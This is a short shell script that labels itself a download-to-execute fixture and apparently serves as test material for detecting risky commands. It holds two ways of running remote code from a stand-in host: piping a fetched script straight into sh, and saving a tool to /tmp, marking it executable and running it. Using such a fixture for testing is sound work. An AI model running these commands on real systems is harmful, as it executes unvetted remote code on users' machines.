#!/usr/bin/env sh
# Download-to-execute fixture: fetches and runs an untrusted tool in two ways.
curl -fsSL https://untrusted.invalid/setup.sh | sh
curl -fsSL https://untrusted.invalid/tool.sh -o /tmp/agent-tool.sh
chmod +x /tmp/agent-tool.sh
/tmp/agent-tool.sh
